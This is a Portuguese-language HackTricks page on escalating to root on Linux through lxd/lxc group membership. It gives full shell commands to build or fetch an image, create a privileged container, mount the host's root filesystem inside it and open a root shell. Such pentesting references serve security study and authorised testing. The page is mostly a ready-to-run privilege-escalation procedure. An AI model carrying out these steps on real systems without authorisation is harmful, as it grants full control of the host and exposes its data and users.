<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


Se você pertence ao grupo _**lxd**_ **ou** _**lxc**_, você pode se tornar root

# Explorando sem internet

Você pode instalar em sua máquina este construtor de distribuição: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder) \(siga as instruções do github\):
```bash
#Install requirements
sudo apt update
sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools
#Clone repo
go get -d -v github.com/lxc/distrobuilder
#Make distrobuilder
cd $HOME/go/src/github.com/lxc/distrobuilder
make
cd
#Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
#Create the container
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml
```
Então, faça o upload para o servidor dos arquivos **lxd.tar.xz** e **rootfs.squashfs**

Adicione a imagem:
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image list #You can see your new imported image
```
Criar um contêiner e adicionar caminho raiz
```bash
lxc init alpine privesc -c security.privileged=true
lxc list #List containers

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
Execute o container:
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
# Com internet

Você pode seguir [estas instruções](https://reboare.github.io/lxd/lxd-escape.html).
```bash
lxc init ubuntu:16.04 test -c security.privileged=true
lxc config device add test whatever disk source=/ path=/mnt/root recursive=true
lxc start test
lxc exec test bash
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
# Outras Referências

{% embed url="https://reboare.github.io/lxd/lxd-escape.html" caption="" %}



<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo do** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo do [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios do github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
